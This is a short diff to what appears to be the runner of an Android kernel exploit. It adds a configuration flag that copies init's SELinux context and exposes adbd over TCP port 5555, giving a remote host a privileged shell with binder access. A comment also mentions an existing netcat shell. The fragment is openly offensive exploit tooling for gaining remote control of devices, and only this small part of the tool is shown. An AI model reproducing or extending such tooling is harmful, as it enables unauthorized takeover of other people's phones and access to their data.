@@ -21,6 +21,11 @@ final class Runner {
             {"GHOST_WAITER_CORE", "2"},
             {"GHOST_PARK", "1"},
             {"GHOST_FOPS_TRUE", "1"},
+            // Copy init's SELinux SID and bring up adbd over TCP (port 5555)
+            // so a host with a pre-authorized key gets a real u:r:shell:s0
+            // with full binder. Drop this line to keep the classic
+            // kernel-SID nc shell only.
+            {"GHOST_ENABLE_ADB", "1"},
     };
 
     static final int EXPLOIT_TIMEOUT_MS = 300_000;
